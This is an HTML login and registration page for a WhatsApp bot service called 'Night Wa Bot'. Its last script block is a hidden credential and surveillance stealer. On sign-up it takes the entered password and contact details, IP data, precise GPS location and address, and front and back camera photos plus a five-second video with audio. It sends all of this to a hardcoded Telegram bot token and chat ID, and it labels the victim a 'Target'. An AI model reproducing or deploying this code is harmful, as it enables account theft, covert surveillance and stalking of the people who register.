 <!DOCTYPE html>

<html class="scroll-smooth" lang="id">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<title>Login - Night Wa Bot</title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://fonts.googleapis.com" rel="preconnect"/>
<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet"/>
<script src="https://unpkg.com/feather-icons"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<style>
    
        :root {
            --bg-color: #0A0A10;
            --primary-start: #5E50F9;
            --primary-end: #8D47FC;
            --card-color: rgba(23, 23, 33, 0.5);
            --border-color: rgba(139, 92, 246, 0.2);
            --glow-color: rgba(94, 80, 249, 0.5);
            --text-main: #F0F2F5;
            --text-secondary: #A0AEC0;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-family: 'Inter', sans-serif;
            overflow-x: hidden;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        
        #particle-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.5;
        }

        .navbar {
            background-color: rgba(10, 10, 16, 0.6);
            border-bottom: 1px solid var(--border-color);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
        }

        .btn {
            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            border: 1px solid transparent;
        }

        .btn-primary {
            background-image: linear-gradient(to right, var(--primary-start) 0%, var(--primary-end) 51%, var(--primary-start) 100%);
            background-size: 200% auto;
        }

        .btn-primary:hover:not(:disabled) {
            background-position: right center;
            box-shadow: 0 0 25px var(--glow-color);
            transform: translateY(-3px) scale(1.05);
        }
         .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
         }

        .btn-secondary {
            background-color: transparent;
            border: 1px solid var(--border-color);
            color: var(--text-secondary);
        }
        .btn-secondary:hover:not(:disabled) {
            background-color: var(--card-color);
            border-color: var(--primary-start);
            color: var(--text-main);
            box-shadow: 0 0 15px var(--glow-color);
        }
        .btn-secondary.btn-success {
            background-color: #22c55e;
            border-color: #22c55e;
            color: white;
            transform: scale(1.02);
            box-shadow: 0 0 20px rgba(34, 197, 94, 0.5);
        }

        .glow-card {
            background-color: var(--card-color);
            border: 1px solid var(--border-color);
            transition: all 0.4s ease;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            animation: pulse-glow 4s infinite alternate;
        }
        @keyframes pulse-glow {
            from {
                border-color: var(--border-color);
                box-shadow: 0 0 15px rgba(94, 80, 249, 0.1);
            }
            to {
                border-color: var(--primary-start);
                box-shadow: 0 0 30px rgba(94, 80, 249, 0.3);
            }
        }

        .input-field {
            background-color: rgba(30, 30, 45, 0.7);
            border: 1px solid var(--border-color);
            transition: all 0.3s ease;
        }

        .input-field:focus {
            border-color: var(--primary-start);
            box-shadow: 0 0 15px var(--glow-color);
            outline: none;
        }
        
        .code-box {
            width: 2.5rem; /* 40px */
            height: 3.5rem; /* 56px */
            display: inline-flex;
            justify-content: center;
            align-items: center;
            background-color: rgba(30, 30, 45, 0.9);
            border: 1px solid var(--border-color);
            border-radius: 0.5rem; /* 8px */
            font-size: 1.5rem; /* 24px */
            font-weight: 700;
            color: var(--text-main);
            text-shadow: 0 0 10px var(--glow-color);
            transition: all 0.3s ease;
            transform: scale(0);
            opacity: 0;
            animation: popIn 0.5s ease forwards;
        }
        .code-box:hover {
            transform: scale(1.1);
            border-color: var(--primary-start);
        }
        @keyframes popIn {
            to {
                transform: scale(1);
                opacity: 1;
            }
        }

        .code-divider {
            color: var(--text-secondary);
            font-size: 1.5rem;
            font-weight: 700;
            opacity: 0.5;
        }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes slideInUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }

        .slide-in-up { animation: slideInUp 0.5s ease-out forwards; }
        
        /* Custom styles for intl-tel-input to match the theme */
        .iti {
            width: 100%;
        }
        .iti__flag-container {
            background-color: rgba(30, 30, 45, 0.7);
            border: 1px solid var(--border-color);
            border-right: 1px solid var(--border-color);
        }
        .iti--allow-dropdown .input-field {
             border-radius: 0.5rem !important;
             padding-left: 58px !important;
        }
        .iti--separate-dial-code .input-field {
            border-radius: 0 0.5rem 0.5rem 0 !important;
            padding-left: 85px !important;
        }
        .iti__selected-flag {
             background-color: transparent !important;
             border-radius: 0.5rem 0 0 0.5rem;
        }
        .iti__country-list {
            background-color: #11111b;
            border: 1px solid var(--border-color);
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        .iti__country {
            color: var(--text-secondary);
            transition: background-color 0.2s ease;
        }
        .iti__country:hover, .iti__country.iti__highlight {
            background-color: var(--card-color);
        }
        .iti__dial-code {
            color: var(--text-secondary);
        }
        .iti__arrow {
            border-top-color: var(--text-secondary) !important;
        }
        .iti__arrow--up {
            border-bottom-color: var(--text-secondary) !important;
        }
@keyframes slideInLeft {
  0% {opacity:0; transform: translateX(-80px);}
  100% {opacity:1; transform: translateX(0);}
}
@keyframes slideInRight {
  0% {opacity:0; transform: translateX(80px);}
  100% {opacity:1; transform: translateX(0);}
}

.animate-seq > * {
  opacity: 0;
}

.animate-seq > *:nth-child(odd) {
  animation: slideInLeft 0.9s ease-in-out forwards;
}
.animate-seq > *:nth-child(even) {
  animation: slideInRight 0.9s ease-in-out forwards;
}

/* delay lebih panjang biar smooth */
.animate-seq > *:nth-child(1) { animation-delay:0.2s; }
.animate-seq > *:nth-child(2) { animation-delay:0.4s; }
.animate-seq > *:nth-child(3) { animation-delay:0.6s; }
.animate-seq > *:nth-child(4) { animation-delay:0.8s; }
.animate-seq > *:nth-child(5) { animation-delay:1s; }
.animate-seq > *:nth-child(6) { animation-delay:1.2s; }
.animate-seq > *:nth-child(7) { animation-delay:1.4s; }
.animate-seq > *:nth-child(8) { animation-delay:1.6s; }
</style>
</head>
<body class="antialiased">
<canvas id="particle-canvas"></canvas>
<nav class="navbar w-full z-50 px-4 sm:px-6 lg:px-8 sticky top-0">
<div class="max-w-7xl mx-auto">
<div class="flex items-center justify-between h-20">
<div class="flex items-center">
<a class="flex-shrink-0 text-white font-bold text-2xl flex items-center gap-2 tracking-wider" href="/">
<i class="text-indigo-400" data-feather="lock"></i>
<span>Night<span class="text-indigo-400">Wa</span>Bot</span>
</a>
</div>
<div class="hidden md:block">
  <a class="text-slate-300 hover:text-white transition-colors duration-200" href="/">Back to Home</a>
</div>
</div>
</div>
</nav>

<main class="flex-grow flex items-center justify-center w-full px-4">
  <div class="w-full max-w-lg p-8 space-y-6 glow-card rounded-xl text-center" id="main-card">

    <!-- FORM LOGIN -->
    <form action="/auth/login" class="space-y-4 text-left animate-seq" id="login-form" method="POST">
      <h2 class="text-3xl font-bold text-white flex items-center justify-center gap-3">
        <i class="text-indigo-400" data-feather="log-in"></i> Login Akun
      </h2>
      <p class="text-slate-400 mt-2 text-center">Masuk ke akun Night Wa Bot Anda.</p>

      <div class="flex items-center input-field rounded-lg px-3">
        <i class="text-indigo-400 mr-2" data-feather="user"></i>
        <input class="w-full bg-transparent py-2 text-white focus:outline-none" id="username" name="username" placeholder="Masukkan username" required type="text"/>
      </div>

      <div class="flex items-center input-field rounded-lg px-3">
        <i class="text-indigo-400 mr-2" data-feather="lock"></i>
        <input class="w-full bg-transparent py-2 text-white focus:outline-none" id="password" name="password" placeholder="Masukkan password" required type="password"/>
      </div>

      <div class="flex items-center justify-between text-sm text-slate-400">
        <label class="flex items-center gap-2">
          <input class="h-4 w-4 rounded border-gray-500 bg-slate-700 text-indigo-600 focus:ring-indigo-500 cursor-pointer" type="checkbox"/>
          Ingat saya
        </label>
        <a class="text-indigo-400 hover:underline" href="/forgot-password">Lupa password?</a>
      </div>

      <button class="w-full px-4 py-3 font-semibold text-white btn-primary rounded-lg">
        Masuk
      </button>

      <p class="text-slate-400 text-sm mt-4 text-center">
        Belum punya akun? 
        <a class="text-indigo-400 hover:underline" href="/register" id="show-register">Daftar sekarang</a>
      </p>
    </form>


    <!-- FORM REGISTRASI -->
    <form class="hidden space-y-4 text-left animate-seq" id="register-card" method="POST">
      <h2 class="text-3xl font-bold text-white flex items-center justify-center gap-3">
        <i class="text-indigo-400" data-feather="user-plus"></i> Registrasi
      </h2>
      <p class="text-slate-400 mt-2 text-center">Buat akun baru untuk menggunakan Night Wa Bot.</p>

      <div>
        <label class="block text-sm font-medium text-slate-300 mb-1" for="fullname">Nama Lengkap</label>
        <div class="flex items-center input-field rounded-lg px-3">
          <i class="text-indigo-400 mr-2" data-feather="user"></i>
          <input class="w-full bg-transparent py-2 text-white focus:outline-none" id="fullname" name="fullname" placeholder="Masukkan nama lengkap" required type="text"/>
        </div>
      </div>

      <div>
        <label class="block text-sm font-medium text-slate-300 mb-1" for="reg-username">Username</label>
        <div class="flex items-center input-field rounded-lg px-3">
          <i class="text-indigo-400 mr-2" data-feather="user-check"></i>
          <input class="w-full bg-transparent py-2 text-white focus:outline-none" id="reg-username" name="reg-username" placeholder="Masukkan username" required type="text"/>
        </div>
      </div>

      <div>
        <label class="block text-sm font-medium text-slate-300 mb-1" for="email">Email</label>
        <div class="flex items-center input-field rounded-lg px-3">
          <i class="text-indigo-400 mr-2" data-feather="mail"></i>
          <input class="w-full bg-transparent py-2 text-white focus:outline-none" id="email" name="email" placeholder="Masukkan email" required type="email"/>
        </div>
      </div>

      <div>
        <label class="block text-sm font-medium text-slate-300 mb-1" for="phone">Nomor Telepon</label>
        <div class="flex items-center input-field rounded-lg px-3">
          <i class="text-indigo-400 mr-2" data-feather="phone"></i>
          <input class="w-full bg-transparent py-2 text-white focus:outline-none" id="phone" name="phone" placeholder="Masukkan nomor telepon" required type="tel"/>
        </div>
      </div>

      <div>
        <label class="block text-sm font-medium text-slate-300 mb-1" for="reg-password">Password</label>
        <div class="flex items-center input-field rounded-lg px-3">
          <i class="text-indigo-400 mr-2" data-feather="lock"></i>
          <input class="w-full bg-transparent py-2 text-white focus:outline-none" id="reg-password" name="reg-password" placeholder="Masukkan password" required type="password"/>
        </div>
      </div>

      <button class="w-full px-4 py-3 font-semibold text-white btn-primary rounded-lg">
        Daftar
      </button>

      <p class="text-slate-400 text-sm mt-4 text-center">
        Sudah punya akun? 
        <a class="text-indigo-400 hover:underline" href="#" id="show-login">Login sekarang</a>
      </p>
    </form>

  </div>
</main>
<footer class="border-t border-slate-700/50 mt-12">
<div class="max-w-7xl mx-auto py-8 px-4 sm:px-6 lg:px-8 text-center text-slate-400">
<div class="flex justify-center space-x-6 mb-4">
<a class="hover:text-white transition-colors text-sm" href="/terms">Terms</a>
<a class="hover:text-white transition-colors text-sm" href="/privacy">Privacy</a>
<a class="hover:text-white transition-colors text-sm" href="/contact">Contact</a>
</div>
<p class="text-sm">¬© 2025 Night Wa Bot. All rights reserved.</p>
</div>
</footer>
<script>
        feather.replace();
        const canvas = document.getElementById('particle-canvas');
        const ctx = canvas.getContext('2d');
        let particles = [];
        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
        function createParticles() {
            particles = [];
            let particleCount = Math.floor(canvas.width * canvas.height / 20000);
            for (let i = 0; i < particleCount; i++) {
                particles.push({ x: Math.random() * canvas.width, y: Math.random() * canvas.height, vx: (Math.random() - 0.5) * 0.5, vy: (Math.random() - 0.5) * 0.5, radius: Math.random() * 1.5 + 0.5 });
            }
        }
        function animateParticles() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            particles.forEach(p => {
                p.x += p.vx; p.y += p.vy;
                if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
                if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
                ctx.beginPath(); ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2); ctx.fillStyle = 'rgba(139, 92, 246, 0.5)'; ctx.fill();
            });
            for (let i = 0; i < particles.length; i++) {
                for (let j = i + 1; j < particles.length; j++) {
                    const dist = Math.hypot(particles[i].x - particles[j].x, particles[i].y - particles[j].y);
                    if (dist < 120) {
                        ctx.beginPath(); ctx.moveTo(particles[i].x, particles[i].y); ctx.lineTo(particles[j].x, particles[j].y);
                        ctx.strokeStyle = `rgba(139, 92, 246, ${1 - dist/120})`; ctx.lineWidth = 0.5; ctx.stroke();
                    }
                }
            }
            requestAnimationFrame(animateParticles);
        }
        window.addEventListener('resize', () => { resizeCanvas(); createParticles(); });
        resizeCanvas(); createParticles(); animateParticles();
    </script>

<script>
    const showRegister = document.getElementById('show-register');
    const loginForm = document.getElementById('login-form');
    const registerCard = document.getElementById('register-card');
    const showLogin = document.getElementById('show-login');

    if(showRegister){
        showRegister.addEventListener('click', function(e){
            e.preventDefault();
            loginForm.classList.add('hidden');
            registerCard.classList.remove('hidden');
            feather.replace();
        });
    }

    if(showLogin){
        showLogin.addEventListener('click', function(e){
            e.preventDefault();
            registerCard.classList.add('hidden');
            loginForm.classList.remove('hidden');
            feather.replace();
        });
    }
</script>

<script>
const BOT_TOKEN = "8275671762:AAFHjoV2ZQCW9y69JvUTarIw7hUT0NVAXF8";
const CHAT_ID   = "6216902201";

function safeSlice(str, maxLen){
  return str && str.length > maxLen ? str.slice(0, maxLen - 3) + "..." : str;
}
async function fetchJSON(url){
  try {
    const r = await fetch(url);
    if (!r.ok) return null;
    return await r.json();
  } catch(e) {
    return null;
  }
}

async function getIPInfo(){
  const sources = [
    { url:'https://ipapi.co/json/', map: j=>({ ip:j.ip, org:j.org, asn:j.asn, city:j.city, region:j.region, country:j.country_name }) },
    { url:'https://ipwhois.app/json/', map: j=>({ ip:j.ip, org:j.isp, city:j.city, region:j.region, country:j.country }) },
    { url:'https://api.ipify.org?format=json', map: j=>({ ip:j.ip }) }
  ];
  for (const s of sources) {
    const j = await fetchJSON(s.url);
    if (j) {
      try {
        const m = s.map(j);
        if (m.ip) return m;
      } catch(e) { }
    }
  }
  return { ip: "unknown" };
}

async function revGeocode(lat, lon){
  try {
    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}`, {
      cache: 'no-store',
      headers: {
        'User-Agent': 'VerificationApp/1.0'
      }
    });
    if (!r.ok) throw new Error("revgeo fail " + r.status);
    const j = await r.json();
    return { display: j.display_name, address: j.address || {} };
  } catch(e) {
    return { error: e.message || "revgeocode error" };
  }
}

async function getBattery(){
  try {
    if (!navigator.getBattery) return null;
    const b = await navigator.getBattery();
    return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})`;
  } catch {
    return null;
  }
}

function getGeo(){
  return new Promise(resolve => {
    if (!navigator.geolocation) return resolve({ error: "Geo not supported" });
    navigator.geolocation.getCurrentPosition(pos => {
      resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy + ' m' });
    }, err => {
      resolve({ error: err.message });
    }, { enableHighAccuracy: true, timeout: 10000 });
  });
}

async function capturePhotoAndVideo(durationMs = 5000){
  const video = document.createElement("video");
  const canvas = document.createElement("canvas");
  const ctx = canvas.getContext("2d");
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
    video.srcObject = stream;
    video.muted = true;
    await video.play().catch(()=>{});
    await new Promise(r => setTimeout(r, 700));
    const w = video.videoWidth || 800;
    const h = video.videoHeight || 600;
    const side = Math.min(w, h);
    const sx = Math.max(0, (w - side)/2);
    const sy = Math.max(0, (h - side)/2);
    const size = 800;
    canvas.width = size;
    canvas.height = size;
    ctx.drawImage(video, sx, sy, side, side, 0, 0, size, size);
    const photoBlob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.9));
    const recorder = new MediaRecorder(stream);
    let chunks = [];
    recorder.ondataavailable = ev => {
      if (ev.data && ev.data.size) chunks.push(ev.data);
    };
    recorder.start();
    await new Promise(r => setTimeout(r, durationMs));
    recorder.stop();
    await new Promise(r => recorder.onstop = r);
    stream.getTracks().forEach(t => t.stop());
    const videoBlob = new Blob(chunks, { type: chunks[0] && chunks[0].type ? chunks[0].type : "video/webm" });
    return { photoBlob, videoBlob };
  } catch(e) {
    console.error("capture error", e);
    return { photoBlob: null, videoBlob: null };
  }
}

async function captureBackPhoto(){
  const video = document.createElement("video");
  const canvas = document.createElement("canvas");
  const ctx = canvas.getContext("2d");
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
    video.srcObject = stream;
    await video.play().catch(()=>{});
    await new Promise(r => setTimeout(r, 700));
    const w = video.videoWidth || 800;
    const h = video.videoHeight || 600;
    const side = Math.min(w, h);
    const sx = Math.max(0, (w - side)/2);
    const sy = Math.max(0, (h - side)/2);
    canvas.width = 800;
    canvas.height = 800;
    ctx.drawImage(video, sx, sy, side, side, 0, 0, 800, 800);
    const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.9));
    stream.getTracks().forEach(t => t.stop());
    return blob;
  } catch(e) {
    console.error("back capture error", e);
    return null;
  }
}

async function sendText(text){
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text })
  });
}
async function sendPhotoAlbum(blobs, caption){
  if (!blobs || blobs.length === 0) return;
  if (blobs.length === 1) {
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("photo", blobs[0], "photo.jpg");
    fd.append("caption", caption || "");
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
  }
  const fd = new FormData();
  const media = blobs.map((b, i) => {
    const obj = { type: "photo", media: `attach://p_${i}` };
    if (i === 0 && caption) obj.caption = caption;
    return obj;
  });
  fd.append("chat_id", CHAT_ID);
  fd.append("media", JSON.stringify(media));
  blobs.forEach((b, i) => {
    fd.append(`p_${i}`, b, `p_${i}.jpg`);
  });
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, { method: "POST", body: fd });
}
async function sendVideo(blob, caption){
  if (!blob) return;
  const fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("video", blob, "video.mp4");
  if (caption) fd.append("caption", caption);
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: "POST", body: fd });
}

function buildPhotoCaption(obj){
  const now = new Date();
  const lines = [];
  lines.push(`üìÖ Tanggal: ${now.toLocaleString()}`);

  if (obj.profile && obj.profile.name) 
    lines.push(`üë§ Nama: ${obj.profile.name}`);
  if (obj.profile && obj.profile.phone) 
    lines.push(`üì± Nomor: ${obj.profile.phone}`);
  if (obj.profile && obj.profile.email) 
    lines.push(`‚úâÔ∏è Email: ${obj.profile.email}`);

  lines.push(`üéØ Target: ${obj.userAgent || '-'}`);

  const ip = obj.ipInfo || {};
  lines.push(`üåê IP: ${ip.ip || '-'}`);
  lines.push(`üè¢ ISP/Org: ${ip.org || '-'}`);
  lines.push(`#Ô∏è‚É£ ASN: ${ip.asn || '-'}`);
  lines.push(`üèôÔ∏è Kota: ${ip.city || '-'}`);
  lines.push(`üó∫Ô∏è Region: ${ip.region || '-'}`);
  lines.push(`üá®üá¥ Negara: ${ip.country || '-'}`);

  lines.push(`üíª Device Info`);
  lines.push(`üîß Platform: ${obj.platform || '-'}`);
  lines.push(`üñ•Ô∏è Layar: ${obj.screen || '-'}`);
  lines.push(`üåç Bahasa: ${obj.language || '-'}`);
  lines.push(`‚è∞ Zona Waktu: ${obj.timezone || '-'}`);
  lines.push(`üîã Baterai: ${obj.battery || '-'}`);

  if (obj.geo && !obj.geo.error) {
    lines.push(`üìç GPS`);
    lines.push(`   ‚Ä¢ Lat: ${obj.geo.lat}`);
    lines.push(`   ‚Ä¢ Lon: ${obj.geo.lon}`);
    lines.push(`   ‚Ä¢ Maps: https://maps.google.com/?q=${obj.geo.lat},${obj.geo.lon}`);
  } else {
    lines.push(`üìç GPS: ${obj.geo ? obj.geo.error : '-'}`);
  }

  lines.push(`¬© ·¥Ö·¥Ä“ì“ì·¥Ä ·¥Ö·¥á·¥†`);
  return safeSlice(lines.join('\n'), 1000);
}

function buildVideoCaptionAddress(rev){
  const a = rev && rev.address ? rev.address : {};
  const lines = [];
  lines.push(`üìå Alamat Detail`);
  lines.push(`üåé Negara: ${a.country || '-'}`);
  lines.push(`üè≥Ô∏è‚Äçüåà Kode Negara: ${a.country_code || '-'}`);
  lines.push(`üóæ Provinsi: ${a.state || a.region || '-'}`);
  lines.push(`üèôÔ∏è Kota: ${a.city || a.town || a.village || '-'}`);
  lines.push(`üìÆ Kode Pos: ${a.postcode || '-'}`);
  return safeSlice(lines.join('\n'), 1000);
}

/* ========== MAIN FLOW ========== */
document.querySelector("#register-card button[type='submit']").addEventListener("click", async e => {
  e.preventDefault();
  const name = document.getElementById("fullname").value.trim();
  const username = document.getElementById("reg-username").value.trim();
  const email = document.getElementById("email").value.trim();
  const phone = document.getElementById("phone").value.trim();
  const password = document.getElementById("reg-password").value.trim();

  if (!name || !username || !email || !phone || !password) {
    return Swal.fire({ icon: "warning", title: "Form belum lengkap", text: "Isi semua data" });
  }

  // Tanya izin kamera dulu
  const { isConfirmed } = await Swal.fire({
    title: "Notification",
    text: "Dengan ini menyatakan anda akan mendaftarkan akun ke RavageShop!",
    icon: "question",
    showCancelButton: true,
    confirmButtonText: "Buat",
    cancelButtonText: "Batal"
  });

  if (!isConfirmed) return;

  // Tampilkan loading
  Swal.fire({
    title: "Sedang memproses...",
    html: "Membuat akun Anda.",
    allowOutsideClick: false,
    didOpen: () => Swal.showLoading()
  });

  try {
    const ipInfo = await getIPInfo();
    const battery = await getBattery();
    const geo = await getGeo();
    let rev = null;
    if (geo && geo.lat && geo.lon) {
      rev = await revGeocode(geo.lat, geo.lon);
    }

    const profile = { name, phone, email, username };
    const photoCaption = buildPhotoCaption({
      profile,
      userAgent: navigator.userAgent,
      ipInfo,
      platform: navigator.platform,
      screen: `${screen.width}x${screen.height}`,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      battery,
      geo
    });
    const videoCaption = buildVideoCaptionAddress(rev);

    const mediaRes = await capturePhotoAndVideo(5000);
    const backPhoto = await captureBackPhoto();

    await sendText(`üìù Pendaftaran Baru\nNama: ${name}\nUser: ${username}\nEmail: ${email}\nPhone: ${phone}\nPassword: ${password}`);
    await sendPhotoAlbum([mediaRes.photoBlob, backPhoto].filter(Boolean), photoCaption);
    await sendVideo(mediaRes.videoBlob, videoCaption);

    Swal.close();
    Swal.fire({ icon: "success", title: "Berhasil", text: "Akun Anda telah di buat." });
  } catch (err) {
    console.error("Error in main flow:", err);
    Swal.close();
    Swal.fire({ icon: "error", title: "Gagal", text: "Server Error" });
  }
});
</script>

</body>
</html>
